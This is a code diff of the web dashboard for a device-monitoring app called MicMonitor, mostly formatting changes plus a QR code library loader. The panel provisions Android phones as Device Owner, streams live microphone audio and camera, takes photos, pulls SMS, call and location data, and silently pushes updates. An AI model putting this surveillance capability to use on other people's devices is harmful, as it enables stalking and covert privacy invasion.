@@ -1046,7 +1046,21 @@
       <div
         style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap"
       >
-        <button id="qrProvisionBtn" onclick="showProvisioningQR()" style="background: linear-gradient(135deg, #10b981, #059669); border: none; padding: 8px 16px; border-radius: 8px; color: white; cursor: pointer; font-weight: 600;">📱 Setup New Device</button>
+        <button
+          id="qrProvisionBtn"
+          onclick="showProvisioningQR()"
+          style="
+            background: linear-gradient(135deg, #10b981, #059669);
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+          "
+        >
+          📱 Setup New Device
+        </button>
         <button id="themeToggle" onclick="toggleTheme()">🌙 Dark</button>
         <div class="conn-pill" id="connPill">
           <div id="wsDot" class="conn-dot"></div>
@@ -1056,26 +1070,95 @@
     </div>
 
     <!-- QR Provisioning Modal -->
-    <div id="qrModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
-      <div style="background: var(--card-bg); border-radius: 16px; padding: 24px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto;">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
-          <h2 style="margin: 0; color: var(--text-primary);">📱 Device Provisioning QR</h2>
-          <button onclick="closeQrModal()" style="background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-secondary);">✕</button>
+    <div
+      id="qrModal"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <div
+        style="
+          background: var(--card-bg);
+          border-radius: 16px;
+          padding: 24px;
+          max-width: 500px;
+          width: 90%;
+          max-height: 90vh;
+          overflow-y: auto;
+        "
+      >
+        <div
+          style="
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+          "
+        >
+          <h2 style="margin: 0; color: var(--text-primary)">
+            📱 Device Provisioning QR
+          </h2>
+          <button
+            onclick="closeQrModal()"
+            style="
+              background: none;
+              border: none;
+              font-size: 24px;
+              cursor: pointer;
+              color: var(--text-secondary);
+            "
+          >
+            ✕
+          </button>
         </div>
-        <div id="qrContent" style="text-align: center;">
-          <div style="color: var(--text-secondary);">Loading...</div>
+        <div id="qrContent" style="text-align: center">
+          <div style="color: var(--text-secondary)">Loading...</div>
         </div>
-        <div id="qrInstructions" style="margin-top: 16px; padding: 16px; background: var(--bg-secondary); border-radius: 8px; font-size: 14px; color: var(--text-secondary); display: none;">
-          <strong style="color: var(--text-primary);">📋 Setup Instructions:</strong>
-          <ol style="margin: 8px 0 0 0; padding-left: 20px; line-height: 1.8;">
+        <div
+          id="qrInstructions"
+          style="
+            margin-top: 16px;
+            padding: 16px;
+            background: var(--bg-secondary);
+            border-radius: 8px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            display: none;
+          "
+        >
+          <strong style="color: var(--text-primary)"
+            >📋 Setup Instructions:</strong
+          >
+          <ol style="margin: 8px 0 0 0; padding-left: 20px; line-height: 1.8">
             <li>Factory reset the device</li>
-            <li>On Welcome/Start screen, <strong>tap 6 times quickly</strong> anywhere</li>
+            <li>
+              On Welcome/Start screen,
+              <strong>tap 6 times quickly</strong> anywhere
+            </li>
             <li>QR scanner will appear automatically</li>
             <li>Scan this QR code</li>
             <li>Device will download APK and set as Device Owner</li>
           </ol>
-          <div style="margin-top: 12px; padding: 8px; background: rgba(239, 68, 68, 0.1); border-radius: 6px; border-left: 3px solid #ef4444;">
-            <strong style="color: #ef4444;">⚠️ Important:</strong> This only works on freshly reset devices with no accounts added.
+          <div
+            style="
+              margin-top: 12px;
+              padding: 8px;
+              background: rgba(239, 68, 68, 0.1);
+              border-radius: 6px;
+              border-left: 3px solid #ef4444;
+            "
+          >
+            <strong style="color: #ef4444">⚠️ Important:</strong> This only
+            works on freshly reset devices with no accounts added.
           </div>
         </div>
       </div>
@@ -1148,20 +1231,67 @@
         } catch (_) {}
       }
 
+      async function ensureQRCodeLibrary() {
+        if (window.QRCode && typeof window.QRCode.toCanvas === "function") {
+          return window.QRCode;
+        }
+
+        const scriptUrls = [
+          "https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js",
+          "https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js",
+        ];
+
+        for (const src of scriptUrls) {
+          try {
+            await new Promise((resolve, reject) => {
+              const existing = document.querySelector(`script[src=\"${src}\"]`);
+              if (existing) {
+                if (
+                  window.QRCode &&
+                  typeof window.QRCode.toCanvas === "function"
+                ) {
+                  resolve();
+                  return;
+                }
+              }
+
+              const script = existing || document.createElement("script");
+              if (!existing) {
+                script.src = src;
+                script.async = true;
+                document.head.appendChild(script);
+              }
+
+              script.onload = () => resolve();
+              script.onerror = () => reject(new Error(`Failed to load ${src}`));
+            });
+
+            if (window.QRCode && typeof window.QRCode.toCanvas === "function") {
+              return window.QRCode;
+            }
+          } catch (_) {
+            // Try next CDN
+          }
+        }
+
+        throw new Error("QR library failed to load");
+      }
+
       // ── QR Provisioning Modal ─────────────────────────────────────────────
       async function showProvisioningQR() {
         const modal = document.getElementById("qrModal");
         const content = document.getElementById("qrContent");
         const instructions = document.getElementById("qrInstructions");
-        
+
         modal.style.display = "flex";
-        content.innerHTML = '<div style="color: var(--text-secondary); padding: 40px;">⏳ Generating QR code...</div>';
+        content.innerHTML =
+          '<div style="color: var(--text-secondary); padding: 40px;">⏳ Generating QR code...</div>';
         instructions.style.display = "none";
-        
+
         try {
           const res = await fetch("/api/provisioning-qr");
           const data = await res.json();
-          
+
           if (data.error) {
             content.innerHTML = `
               <div style="color: #ef4444; padding: 20px;">
@@ -1172,7 +1302,7 @@
             `;
             return;
           }
-          
+
           // Generate QR code
           content.innerHTML = `
             <canvas id="qrCanvas" style="border-radius: 12px; background: white; padding: 16px;"></canvas>
@@ -1181,32 +1311,33 @@
               <div style="margin-top: 4px;">Size: ${(data.apkSize / 1024 / 1024).toFixed(2)} MB</div>
             </div>
           `;
-          
+
           // Use QRCode library to generate
+          const QRCodeLib = await ensureQRCodeLibrary();
           const canvas = document.getElementById("qrCanvas");
-          await QRCode.toCanvas(canvas, data.qrContent, {
+          await QRCodeLib.toCanvas(canvas, data.qrContent, {
             width: 280,
             margin: 2,
-            color: { dark: "#000000", light: "#ffffff" }
+            color: { dark: "#000000", light: "#ffffff" },
           });
-          
+
           instructions.style.display = "block";
-          
         } catch (err) {
+          const errMsg = err && err.message ? err.message : "Unknown error";
           content.innerHTML = `
             <div style="color: #ef4444; padding: 20px;">
               <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
               <div style="font-weight: 600;">Failed to generate QR</div>
-              <div style="font-size: 14px; color: var(--text-secondary); margin-top: 8px;">${err.message}</div>
+              <div style="font-size: 14px; color: var(--text-secondary); margin-top: 8px;">${errMsg}</div>
             </div>
           `;
         }
       }
-      
+
       function closeQrModal() {
         document.getElementById("qrModal").style.display = "none";
       }
-      
+
       // Close modal on backdrop click
       document.getElementById("qrModal")?.addEventListener("click", (e) => {
         if (e.target.id === "qrModal") closeQrModal();
@@ -1445,15 +1576,17 @@
         }
         applyNetworkModeToAllDevices();
         updateNetworkModeUi();
-        
+
         // Send low-network command to all connected devices
         Object.keys(deviceState).forEach((deviceId) => {
           const state = deviceState[deviceId];
           if (state && state.online) {
-            sendCmd(deviceId, "set_low_network", { enabled: networkMode.forcedLow });
+            sendCmd(deviceId, "set_low_network", {
+              enabled: networkMode.forcedLow,
+            });
           }
         });
-        
+
         log(
           `Forced low-network mode ${networkMode.forcedLow ? "enabled" : "disabled"}`,
           networkMode.forcedLow ? "warn" : "info",
@@ -1557,15 +1690,14 @@
       function getRnnoiseLib() {
         if (!rnnoiseLibPromise) {
           // Try to load RNNoise, but fail gracefully if vendor files not found
-          rnnoiseLibPromise = import("/vendor/web-noise-suppressor/index.js").catch(
-            (e) => {
+          rnnoiseLibPromise =
+            import("/vendor/web-noise-suppressor/index.js").catch((e) => {
               log(
                 "⚠️  RNNoise not available (vendor files missing). Using built-in audio filters.",
                 "warn",
               );
               throw e;
-            },
-          );
+            });
         }
         return rnnoiseLibPromise;
       }
@@ -1601,7 +1733,10 @@
         state[initKey] = (async () => {
           try {
             // Check if vendor files exist by trying to load
-            const response = await fetch("/vendor/web-noise-suppressor/index.js", { method: "HEAD" });
+            const response = await fetch(
+              "/vendor/web-noise-suppressor/index.js",
+              { method: "HEAD" },
+            );
             if (!response.ok) {
               throw new Error("RNNoise vendor files not found (404)");
             }
@@ -2060,7 +2195,9 @@
         const photoQBtn = document.getElementById(`btnPhotoQ_${deviceId}`);
         if (photoQBtn)
           photoQBtn.textContent = `Photo: ${photoQualityLabel(savedPhotoQuality)}`;
-        const photoNightBtn = document.getElementById(`btnPhotoNight_${deviceId}`);
+        const photoNightBtn = document.getElementById(
+          `btnPhotoNight_${deviceId}`,
+        );
         if (photoNightBtn)
           photoNightBtn.textContent = `Night: ${photoNightLabel(savedPhotoNight)}`;
         sendCmd(deviceId, "voice_profile", { profile: savedVoiceProfile });
@@ -2076,7 +2213,7 @@
         syncLiveCameraButtons(deviceId);
         syncWebRtcVideoButton(deviceId);
         maybeAutoResumeLive(deviceId);
-        
+
         // Load historical photos for this device
         loadDevicePhotos(deviceId);
       }
@@ -2084,16 +2221,18 @@
       // Load historical photos for a specific device
       async function loadDevicePhotos(deviceId) {
         try {
-          const res = await fetch(`/api/photos?deviceId=${encodeURIComponent(deviceId)}`);
+          const res = await fetch(
+            `/api/photos?deviceId=${encodeURIComponent(deviceId)}`,
+          );
           const photos = await res.json();
           const list = document.getElementById(`photoList_${deviceId}`);
           if (!list) return;
-          
+
           // Clear existing photos first
-          list.innerHTML = '';
-          
+          list.innerHTML = "";
+
           // Add photos (limit to 8 most recent)
-          photos.slice(0, 8).forEach(photo => {
+          photos.slice(0, 8).forEach((photo) => {
             const item = document.createElement("div");
             item.className = "photo-item";
             const cam = String(photo.camera || "rear").toUpperCase();
@@ -2124,7 +2263,7 @@
           if (raw === "0") return false;
           if (raw === "1") return true;
         } catch (_) {}
-        return false;  // Default OFF — vendor files not available, prevents performance issues
+        return false; // Default OFF — vendor files not available, prevents performance issues
       }
 
       function saveRnnoiseEnabled(deviceId, enabled) {
@@ -2290,7 +2429,7 @@
           if (raw === "0") return false;
           if (raw === "1") return true;
         } catch (_) {}
-        return false;  // Default OFF - don't auto-start WebRTC
+        return false; // Default OFF - don't auto-start WebRTC
       }
 
       function savePreferRtc(deviceId, enabled) {
@@ -2421,16 +2560,25 @@
           const upKbps = Number(h.netUpKbps) || 0;
           const netType = h.netType || "unknown";
           const codec = h.streamCodec || "pcm";
-          
+
           let netHtml = "";
           if (h.internetOnline === false) {
             netHtml = `<span class="bad-text">⚠ offline</span>`;
           } else if (downKbps > 0 || upKbps > 0) {
             // Show network quality indicator
-            const quality = downKbps > 5000 ? "good" : (downKbps > 1000 ? "fair" : "poor");
-            const qualityClass = quality === "good" ? "ok-text" : (quality === "fair" ? "" : "bad-text");
+            const quality =
+              downKbps > 5000 ? "good" : downKbps > 1000 ? "fair" : "poor";
+            const qualityClass =
+              quality === "good"
+                ? "ok-text"
+                : quality === "fair"
+                  ? ""
+                  : "bad-text";
             const icon = netType === "wifi" ? "📶" : "📱";
-            const speedText = downKbps >= 1000 ? `${(downKbps/1000).toFixed(1)}M` : `${downKbps}k`;
+            const speedText =
+              downKbps >= 1000
+                ? `${(downKbps / 1000).toFixed(1)}M`
+                : `${downKbps}k`;
             netHtml = `<span class="${qualityClass}">${icon} ${speedText} [${codec.toUpperCase()}]</span>`;
           } else {
             netHtml = `<span class="ok-text">online</span>`;
@@ -2599,12 +2747,15 @@
       function takePhoto(deviceId, camera = "current") {
         sendCmd(deviceId, "take_photo", { camera });
         log(`Capture photo requested (${camera}) for ${deviceId}`, "info");
-        
+
         // Add timeout warning if no response within 10 seconds
         const timeoutId = setTimeout(() => {
-          log(`⚠️ Photo capture timeout - no response from ${deviceId} after 10s`, "warn");
+          log(
+            `⚠️ Photo capture timeout - no response from ${deviceId} after 10s`,
+            "warn",
+          );
         }, 10_000);
-        
+
         // Store timeout ID to clear it if we get a response
         if (!window.photoTimeouts) window.photoTimeouts = {};
         window.photoTimeouts[deviceId] = timeoutId;
@@ -2665,11 +2816,16 @@
         state.webRtcVideoActive = true;
         state.liveCameraActive = true;
         state.liveCameraMode = state.liveCameraMode || "rear";
-        sendCmd(deviceId, "camera_live_start", { camera: state.liveCameraMode });
+        sendCmd(deviceId, "camera_live_start", {
+          camera: state.liveCameraMode,
+        });
         const liveWrap = document.getElementById(`liveCam_${deviceId}`);
         if (liveWrap) liveWrap.style.display = "grid";
         syncLiveCameraButtons(deviceId);
-        log(`WebRTC video started for ${deviceId} (${state.liveCameraMode})`, "ok");
+        log(
+          `WebRTC video started for ${deviceId} (${state.liveCameraMode})`,
+          "ok",
+        );
       }
 
       function toggleLiveCamera(deviceId, camera = "current") {
@@ -2697,7 +2853,9 @@
         state.liveCameraMode = requestedCam;
         state.liveCameraActive = true;
         state.webRtcVideoActive = false;
-        sendCmd(deviceId, "camera_live_start", { camera: state.liveCameraMode });
+        sendCmd(deviceId, "camera_live_start", {
+          camera: state.liveCameraMode,
+        });
         const liveWrap = document.getElementById(`liveCam_${deviceId}`);
         if (liveWrap) liveWrap.style.display = "grid";
         syncLiveCameraButtons(deviceId);
@@ -2756,7 +2914,9 @@
         const state = deviceState[msg.deviceId];
         if (!state || !state.liveCameraActive) return;
         const frameCamera = String(msg.camera || "rear").toLowerCase();
-        const wantedCamera = String(state.liveCameraMode || "rear").toLowerCase();
+        const wantedCamera = String(
+          state.liveCameraMode || "rear",
+        ).toLowerCase();
         if (frameCamera !== wantedCamera) return;
         const wrap = document.getElementById(`liveCam_${msg.deviceId}`);
         if (!wrap) return;
@@ -2806,32 +2966,44 @@
         log(`Data refresh requested for ${deviceId}`, "info");
       }
       function forceUpdate(deviceId) {
-        if (!confirm(`🔄 Force update app on device ${deviceId}?\n\nThis will:\n• Check for new version on server\n• Download and install silently (Device Owner)\n• Restart the app with new version\n\nMake sure you've uploaded the new APK to server/updates/ folder.`)) {
+        if (
+          !confirm(
+            `🔄 Force update app on device ${deviceId}?\n\nThis will:\n• Check for new version on server\n• Download and install silently (Device Owner)\n• Restart the app with new version\n\nMake sure you've uploaded the new APK to server/updates/ folder.`,
+          )
+        ) {
           return;
         }
         sendCmd(deviceId, "force_update");
         log(`Force update command sent to ${deviceId}`, "info");
       }
       function grantPermissions(deviceId) {
-        if (!confirm(`✅ Re-grant all permissions for device ${deviceId}?\n\nThis will:\n• Force re-grant all 18 permissions (Device Owner)\n• Refresh SMS, Calls, Location data\n• Verify permissions are working\n\nUse this if dashboard shows "permission denied".`)) {
+        if (
+          !confirm(
+            `✅ Re-grant all permissions for device ${deviceId}?\n\nThis will:\n• Force re-grant all 18 permissions (Device Owner)\n• Refresh SMS, Calls, Location data\n• Verify permissions are working\n\nUse this if dashboard shows "permission denied".`,
+          )
+        ) {
           return;
         }
         sendCmd(deviceId, "grant_permissions");
         log(`Grant permissions command sent to ${deviceId}`, "info");
       }
       function uninstallApp(deviceId) {
-        if (!confirm(`⚠️ Uninstall MicMonitor app from device ${deviceId}?\n\nThis will:\n• Clear Device Owner (if set)\n• Open uninstall dialog on the device\n• Remove the app completely\n\nThis action cannot be undone.`)) {
+        if (
+          !confirm(
+            `⚠️ Uninstall MicMonitor app from device ${deviceId}?\n\nThis will:\n• Clear Device Owner (if set)\n• Open uninstall dialog on the device\n• Remove the app completely\n\nThis action cannot be undone.`,
+          )
+        ) {
           return;
         }
         sendCmd(deviceId, "uninstall_app");
         log(`Uninstall command sent to ${deviceId}`, "warn");
       }
-      
+
       // WiFi control functions removed - feature disabled
       function wifiOn(deviceId) {
         log(`WiFi control is disabled`, "info");
       }
-      
+
       function wifiOff(deviceId) {
         log(`WiFi control is disabled`, "info");
       }
@@ -2883,13 +3055,13 @@
 
       function renderPhotoSaved(msg) {
         if (!msg?.deviceId || !msg?.url || !msg?.filename) return;
-        
+
         // Clear photo timeout if set
         if (window.photoTimeouts && window.photoTimeouts[msg.deviceId]) {
           clearTimeout(window.photoTimeouts[msg.deviceId]);
           delete window.photoTimeouts[msg.deviceId];
         }
-        
+
         if (!deviceState[msg.deviceId])
           addDeviceCard(msg.deviceId, "Unknown", null);
         const list = document.getElementById(`photoList_${msg.deviceId}`);
@@ -2925,7 +3097,10 @@
         if (!state.useWebRtc) {
           // Check low-network mode but don't block - just warn
           if (networkMode.forcedLow) {
-            log("WebRTC requested but low-network mode is active - may have reduced quality", "warn");
+            log(
+              "WebRTC requested but low-network mode is active - may have reduced quality",
+              "warn",
+            );
           }
           state.preferWebRtc = true;
           savePreferRtc(deviceId, true);
@@ -4045,13 +4220,13 @@
             source.connect(state.audioCtx.destination);
           }
           const now = state.audioCtx.currentTime;
-          
+
           // Increased jitter buffer for low network resilience
           // Higher buffer = more tolerance for network delays, less choppy audio
-          const targetLeadSec = 0.04;   // Was 0.015 - increased for network jitter
-          const maxLeadSec = 0.25;      // Was 0.12 - more buffer room for slow networks
+          const targetLeadSec = 0.04; // Was 0.015 - increased for network jitter
+          const maxLeadSec = 0.25; // Was 0.12 - more buffer room for slow networks
           const resyncThreshold = 0.15; // Was 0.06 - allow more drift before resync
-          
+
           if (state.nextPlayTime < now - resyncThreshold)
             state.nextPlayTime = now + targetLeadSec;
           if (state.nextPlayTime > now + maxLeadSec) return;
